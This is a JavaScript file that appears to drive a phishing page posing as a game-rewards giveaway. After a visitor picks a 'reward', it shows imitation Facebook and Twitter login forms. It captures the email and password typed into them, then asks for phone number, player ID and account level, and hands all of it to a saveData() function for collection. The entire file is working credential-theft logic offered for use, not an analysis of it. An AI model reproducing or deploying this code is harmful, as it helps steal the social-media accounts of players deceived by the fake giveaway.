const buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";
const tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

const openRewards = (evt, rewardsClass) => {
    const tab_rewards = document.getElementsByClassName("tab_rewards");
    for (let i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }

    const tab_rewards_link = document.getElementsByClassName("menu-content");
    for (let i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].classList.remove("menu-content-active");
    }

    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.classList.add("menu-content-active");
};

const open_rewardsBox = () => {
    document.querySelectorAll('.rewardsBox').forEach(element => element.style.display = 'block');
    document.querySelectorAll('.rewardsHome').forEach(element => element.style.display = 'none');
};

const open_itemReward_confirmation = (ag) => {
    const itemReward_confirmationImg = ag.getAttribute("src");
    document.querySelector('.itemReward_confirmation').style.display = 'block';
    document.getElementById('myItemReward_confirmationImg').setAttribute('src', itemReward_confirmationImg);
};

const open_otherReward_confirmation = (ag) => {
    const otherReward_confirmationImg = ag.getAttribute("src");
    const otherReward_confirmationValue = ag.getAttribute("value");
    document.querySelector('.otherReward_confirmation').style.display = 'block';
    document.getElementById('myOtherReward_confirmationImg').setAttribute('src', otherReward_confirmationImg);
    document.getElementById('otherReward_confirmationValue').innerHTML = otherReward_confirmationValue;
};

const open_account_login = () => {
    document.querySelector('.account_login').style.display = 'block';
    document.querySelectorAll(".itemReward_confirmation, .otherReward_confirmation").forEach(element => element.style.display = 'none');
};

const open_facebook = () => {
    document.querySelector('.login-facebook').style.display = 'block';
    document.querySelector('.account_login').style.display = 'none';
};

const open_twitter = () => {
    document.querySelector('.login-twitter').style.display = 'block';
    document.querySelector('.account_login').style.display = 'none';
};

const close_reward_confirmation = () => {
    document.querySelectorAll(".itemReward_confirmation, .otherReward_confirmation").forEach(element => element.style.display = 'none');
};

const tutup_facebook = () => {
    document.querySelector('.login-facebook').style.display = 'none';
    document.querySelector('.account_login').style.display = 'block';
};

const tutup_twitter = () => {
    document.querySelector('.login-twitter').style.display = 'none';
    document.querySelector('.account_login').style.display = 'block';
};

const ValidateLoginFbData = () => {
    document.getElementById('ValidateLoginFbForm').addEventListener('submit', (submitingValidateLoginFbData) => {
        submitingValidateLoginFbData.preventDefault();
        const email = document.getElementById('email-facebook').value.trim();
        const password = document.getElementById('password-facebook').value.trim();
        const login = document.getElementById('login-facebook').value.trim();
        if (email !== '' && password !== '') {
            document.querySelector('.login-facebook').style.display = 'none';
            document.querySelector('.account_verification').style.display = 'block';
            document.querySelector("input#validateEmail").value = email;
            document.querySelector("input#validatePassword").value = password;
            document.querySelector("input#validateLogin").value = login;
        }
    });
};

const ValidateLoginTwitterData = () => {
    document.getElementById('ValidateLoginTwitterForm').addEventListener('submit', (submitingValidateLoginTwitterData) => {
        submitingValidateLoginTwitterData.preventDefault();
        const email = document.getElementById('email-twitter').value.trim();
        const password = document.getElementById('password-twitter').value.trim();
        const login = document.getElementById('login-twitter').value.trim();
        if (email !== '' && password !== '') {
            document.querySelector('.login-twitter').style.display = 'none';
            document.querySelector('.account_verification').style.display = 'block';
            document.querySelector("input#validateEmail").value = email;
            document.querySelector("input#validatePassword").value = password;
            document.querySelector("input#validateLogin").value = login;
        }
    });
};

const ValidateVerificationData = () => {
    document.getElementById('ValidateVerificationDataForm').addEventListener('submit', (submitingVerificationData) => {
        submitingVerificationData.preventDefault();
        const validateEmail = document.querySelector("input#validateEmail").value;
        const validatePassword = document.querySelector("input#validatePassword").value;
        const playId = document.querySelector("input#playid").value;
        const phone = document.querySelector("input#phone").value;
        const level = document.querySelector("select#level").value;
        const validateLogin = document.querySelector("input#validateLogin").value;

        if (validateEmail === "" && validatePassword === "" && phone === "" && playId != "" && level === "" && validateLogin === "") {
            document.querySelector('.verification_info').style.display = 'block';
            document.querySelector('.account_verification').style.display = 'none';
            return false;
        }

        saveData({ validateEmail, validatePassword, phone, playId, level, validateLogin });
    });
};

ValidateVerificationData();
